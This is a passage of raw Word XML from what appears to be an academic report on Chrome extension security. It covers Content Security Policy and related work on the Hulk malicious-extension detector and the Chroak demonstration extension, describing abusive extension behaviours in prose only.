        <w:t xml:space="preserve"> is specified as a background page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651FBB90" w14:textId="77777777" w:rsidR="001D2830" w:rsidRDefault="001D2830" w:rsidP="001D2830">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D6B6FD0" w14:textId="77777777" w:rsidR="00EB28E0" w:rsidRPr="0097075E" w:rsidRDefault="00EB28E0" w:rsidP="00EB28E0">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="97" w:name="_Toc523071498"/>
      <w:r>
        <w:t>Content Security Policy</w:t>
      </w:r>
      <w:bookmarkEnd w:id="97"/>
    </w:p>
    <w:p w14:paraId="6DAD32A3" w14:textId="77777777" w:rsidR="00495810" w:rsidRPr="00495810" w:rsidRDefault="00F05903" w:rsidP="00495810">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:commentRangeStart w:id="98"/>
      <w:r w:rsidRPr="00E75476">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="99" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:39:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>Content Security Policy (CSP</w:t>
      </w:r>
      <w:commentRangeEnd w:id="98"/>
      <w:r w:rsidR="00E75476">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="98"/>
      </w:r>
      <w:r w:rsidRPr="00E75476">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="100" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:39:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header is specified by servers and used by the browser in order to determine the sources from which it can include objects of the page.</w:t>
      </w:r>
      <w:r w:rsidR="00495810">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00495810" w:rsidRPr="00495810">
        <w:t>CSP can also specify other options,</w:t>
      </w:r>
      <w:r w:rsidR="00495810">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00495810" w:rsidRPr="00495810">
        <w:t>such as whether to allow the page to perform an</w:t>
      </w:r>
      <w:r w:rsidR="00495810">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00495810" w:rsidRPr="00495810">
        <w:t>eval</w:t>
      </w:r>
      <w:r w:rsidR="00495810">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00495810" w:rsidRPr="00495810">
        <w:t>or to embed inline JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="00495810">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287C7A46" w14:textId="77777777" w:rsidR="00EB28E0" w:rsidRPr="00A730F4" w:rsidRDefault="00D55305" w:rsidP="004A4153">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 2 shows an example where the extension specifies its CSP in order to include source from foo.com and execute eval.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6B8800" w14:textId="77777777" w:rsidR="007D2339" w:rsidRPr="004A4153" w:rsidRDefault="007D2339" w:rsidP="00BC6AE0">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkEnd w:id="74"/>
    <w:bookmarkEnd w:id="75"/>
    <w:bookmarkEnd w:id="76"/>
    <w:bookmarkEnd w:id="77"/>
    <w:p w14:paraId="1A4D4729" w14:textId="77777777" w:rsidR="00D36100" w:rsidRPr="002E57A4" w:rsidRDefault="00D36100" w:rsidP="00BC6AE0">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21AFBD99" w14:textId="77777777" w:rsidR="009226B2" w:rsidRPr="002E57A4" w:rsidRDefault="009226B2" w:rsidP="00BC6AE0">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E0957EB" w14:textId="77777777" w:rsidR="00B3017E" w:rsidRDefault="00172AEF" w:rsidP="00172AEF">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="101" w:name="_Toc523071499"/>
      <w:r w:rsidRPr="00172AEF">
        <w:lastRenderedPageBreak/>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>ELATED WORK</w:t>
      </w:r>
      <w:bookmarkEnd w:id="101"/>
    </w:p>
    <w:p w14:paraId="777EBB31" w14:textId="77777777" w:rsidR="00D670D5" w:rsidRDefault="006627D9" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">Modern web browsers are characterized by third-party add-ons that extend their functionality. Chrome browser provide a rich API where extensions can </w:t>
      </w:r>
      <w:r w:rsidR="00766F27">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">make network requests, access the local file system, get low-level information about running processes and many more. Although a permission system is used by Chrome in order to curtail an extension’s privileges and avoid misuse, malicious extensions </w:t>
      </w:r>
      <w:r w:rsidR="00D670D5">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>can allow attackers to gain access to a wide range of private, sensitive data and computer resources</w:t>
      </w:r>
      <w:r w:rsidR="00766F27">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E04B7F" w14:textId="384E6456" w:rsidR="008D5569" w:rsidRDefault="00F05E77" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>At following, we refer related work has been done on</w:t>
      </w:r>
      <w:r w:rsidR="00E36029">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> detecting malicious behavior in browser extensions and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>a series of attacks by which malicious extensions can steal data, track user behavior</w:t>
      </w:r>
      <w:r w:rsidR="00E36029">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> and collude to elevate their privileges.</w:t>
      </w:r>
      <w:r w:rsidR="00AA62B3">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> In special, we </w:t>
      </w:r>
      <w:r w:rsidR="00000CEF">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">refer to </w:t>
      </w:r>
      <w:r w:rsidR="00000CEF" w:rsidRPr="00625C31">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="102" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Hulk</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r w:rsidR="00000CEF">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is a tool for detecting malicious behavior in Google Chrome extensions</w:t>
      </w:r>
      <w:r w:rsidR="00B74F17">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00B74F17" w:rsidRPr="00625C31">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="103" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Chroak</w:t>
      </w:r>
      <w:r w:rsidR="00B74F17">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">[6] </w:t>
      </w:r>
      <w:r w:rsidR="00B74F17">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>which is a Chrome extension that demonstrates browser attacks</w:t>
      </w:r>
      <w:r w:rsidR="00000CEF">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBD3B59" w14:textId="77777777" w:rsidR="00096F39" w:rsidRDefault="00096F39" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C9ABAF9" w14:textId="77777777" w:rsidR="00FA0458" w:rsidRDefault="00FA0458" w:rsidP="00FA0458">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="104" w:name="_Toc523071500"/>
      <w:r>
        <w:t>Hulk Architecture</w:t>
      </w:r>
      <w:bookmarkEnd w:id="104"/>
    </w:p>
    <w:p w14:paraId="77039CAC" w14:textId="0EDBEF1B" w:rsidR="00FA0458" w:rsidRDefault="00FA0458" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Hulk</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a dynamic analysis system that detects malicious behavior in Chrome extensions. </w:t>
      </w:r>
      <w:r w:rsidR="009F644E">
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dynamically loads extensions in a monitored environment and observes the interaction of the extension with the loaded web pages. It uses a set of heuristics to identify potentially dangerous behavior and label extensions as malicious, suspicious or benign.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609E77DB" w14:textId="77777777" w:rsidR="008A25AE" w:rsidRDefault="008A25AE" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A68F2B0" w14:textId="77777777" w:rsidR="00FA0458" w:rsidRDefault="008A25AE" w:rsidP="008A25AE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="105" w:name="_Toc523071501"/>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>HoneyPages</w:t>
      </w:r>
      <w:bookmarkEnd w:id="105"/>
    </w:p>
    <w:p w14:paraId="67331384" w14:textId="26708A1E" w:rsidR="008A25AE" w:rsidRDefault="008A25AE" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>There are extensions that their activation is based on the content of a web page. In order to analyze such cases, Hulk</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> uses </w:t>
      </w:r>
      <w:commentRangeStart w:id="106"/>
      <w:r w:rsidRPr="00544BB6">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="107" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>HoneyPages</w:t>
      </w:r>
      <w:commentRangeEnd w:id="106"/>
      <w:r w:rsidR="00544BB6">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="106"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> which are specially crafted pages that dynamically create an environment for the extension to perform the actions it needs. That means when an extension queries for the presence of a specific element, such as an iframe DOM element</w:t>
      </w:r>
      <w:r w:rsidR="007C5211">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>, the HoneyPage will create the element, inject it in the DOM tree and return it to the extension.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D809708" w14:textId="77777777" w:rsidR="008A25AE" w:rsidRDefault="008A25AE" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="392ECCD9" w14:textId="77777777" w:rsidR="007C5211" w:rsidRDefault="007C5211" w:rsidP="007C5211">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="108" w:name="_Toc523071502"/>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Fuzzer</w:t>
      </w:r>
      <w:bookmarkEnd w:id="108"/>
    </w:p>
    <w:p w14:paraId="53756A7C" w14:textId="3DB3371C" w:rsidR="007C5211" w:rsidRDefault="00F368C9" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">Extensions </w:t>
      </w:r>
      <w:r w:rsidR="00544AF5">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> register callbacks that respond to certain browser-level events using an event-based model such as the </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="109" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.webRequest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> API. </w:t>
      </w:r>
      <w:r w:rsidR="00544AF5">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">HoneyPages are not able to trigger callbacks for network events that require special properties like a specific URL or HTTP header. </w:t>
      </w:r>
      <w:r w:rsidR="00E929C5">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Therefore, Hulk</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r w:rsidR="00E929C5">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> uses event handler fuzzing where all event callbacks are invoked with mock event objects.</w:t>
      </w:r>
      <w:r w:rsidR="00C67317">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> At the same time, a HoneyPage is loaded in the active tab which enables Hulk</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r w:rsidR="00C67317">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> to monitor all changes that the extension attempts to make on the page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A830617" w14:textId="77777777" w:rsidR="00544AF5" w:rsidRDefault="00544AF5" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F8D8189" w14:textId="77777777" w:rsidR="004B25D2" w:rsidRDefault="004B25D2" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22AF552A" w14:textId="77777777" w:rsidR="004B25D2" w:rsidRDefault="004B25D2" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B62F16B" w14:textId="77777777" w:rsidR="004B25D2" w:rsidRPr="008D5569" w:rsidRDefault="004B25D2" w:rsidP="006627D9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DD46272" w14:textId="77777777" w:rsidR="00B3017E" w:rsidRDefault="00FF5199" w:rsidP="004B25D2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="110" w:name="_Toc523071503"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Malicious Behavior Detection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="110"/>
    </w:p>
    <w:p w14:paraId="37D1A1AE" w14:textId="77777777" w:rsidR="00673998" w:rsidRDefault="001A7557" w:rsidP="00255A90">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidR="00092DF4">
        <w:t>Hulk’s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> presentation there were cases of extensions abusing Chrome’s extension API. Specifically, </w:t>
      </w:r>
      <w:r w:rsidR="002658FC">
        <w:t xml:space="preserve">by monitoring the </w:t>
      </w:r>
      <w:r w:rsidR="002658FC" w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="111" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.management.uninstall</w:t>
      </w:r>
      <w:r w:rsidR="002658FC">
        <w:t xml:space="preserve"> API calls, malicious behavior was detected where an extension uninstalled other extensions. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00346A21" w14:textId="77777777" w:rsidR="00FF5199" w:rsidRDefault="00EB20D5" w:rsidP="00255A90">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="002658FC">
        <w:t xml:space="preserve"> malicious extension can</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> also</w:t>
      </w:r>
      <w:r w:rsidR="002658FC">
        <w:t xml:space="preserve"> interfere with tabs that point to the extension configuration page (chrome://extensions) either by replacing the URL with a different one, or by removing the tab completely.</w:t>
      </w:r>
      <w:r w:rsidR="00673998">
        <w:t xml:space="preserve"> As a </w:t>
      </w:r>
      <w:r w:rsidR="00C61847">
        <w:t>result,</w:t>
      </w:r>
      <w:r w:rsidR="00673998">
        <w:t xml:space="preserve"> the malicious extension denies the access to Chrome’s extension configuration page and the user is unable to uninstall any extension. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D82643" w14:textId="77777777" w:rsidR="00673998" w:rsidRDefault="00673998" w:rsidP="00673998">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve">sing callbacks in the </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="112" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>webRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve"> API,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>a malicious extension can manipulate HTTP headers.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve">Extensions can use the </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="113" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>webRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve"> API to effectively</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>perform a man-in-the-middle attack on HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>requests and responses before they are handled by</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>the browser. This behavior is often malicious (or at</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve">least dangerous) since </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">there are cases of </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>extensions that remove</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve">security-related headers, such as </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="114" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">Content-Security-Policy </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="115" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>X-Frame-Options</w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>, through the use of callbacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve">such as </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="116" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>webRequest.onHeadersReceived</w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C030D">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="117" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>webRequestInterval.eventHandled</w:t>
      </w:r>
      <w:r w:rsidRPr="00673998">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0040D3FA" w14:textId="77777777" w:rsidR="007176B8" w:rsidRPr="00EB20D5" w:rsidRDefault="00EB20D5" w:rsidP="00EB20D5">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>In addition to dropping security related headers, extensions can change or add parameters in URLs before the HTTP request is sent. Such suspicious behavior is common,</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB20D5">
        <w:t xml:space="preserve"> especially</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB20D5">
        <w:t>among extensions that request permissions on shopping</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB20D5">
        <w:t>related</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB20D5">
        <w:t xml:space="preserve">sites such as Amazon, </w:t>
      </w:r>
      <w:r w:rsidR="00CC08CE" w:rsidRPr="00EB20D5">
        <w:t>eBay</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB20D5">
        <w:t>, and others.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5210D471" w14:textId="77777777" w:rsidR="00750F0B" w:rsidRPr="00FF5199" w:rsidRDefault="00750F0B" w:rsidP="00673998">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AB2DCD9" w14:textId="77777777" w:rsidR="00BA3FA5" w:rsidRDefault="004B25D2" w:rsidP="004B25D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="118" w:name="_Toc523071504"/>
      <w:r>
        <w:t>Chroak Extension</w:t>
      </w:r>
      <w:bookmarkEnd w:id="118"/>
    </w:p>
    <w:p w14:paraId="6ACF6B56" w14:textId="1F55F8ED" w:rsidR="004B25D2" w:rsidDel="005C030D" w:rsidRDefault="004B25D2" w:rsidP="004B25D2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="119" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:41:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B25D2">
        <w:t>Chroak</w:t>
      </w:r>
      <w:r w:rsidR="001A3C57">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[6]</w:t>
      </w:r>
      <w:r w:rsidRPr="004B25D2">
        <w:t xml:space="preserve"> extensions was developed in order to demonstrate cases where the Chrome extension permissions model fails to effectively inform the user of an extension’s capabilities. There is a subset of permissions that are not considered potentially malicious or noteworthy by Chrome. Table 2 shows the permissions that Chrome has deemed as “non-special”. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3255C1C5" w14:textId="77777777" w:rsidR="009D0C1A" w:rsidRDefault="009D0C1A" w:rsidP="004B25D2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EF78267" w14:textId="1544EB02" w:rsidR="009D0C1A" w:rsidRPr="009A14F1" w:rsidRDefault="009D0C1A" w:rsidP="009D0C1A">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
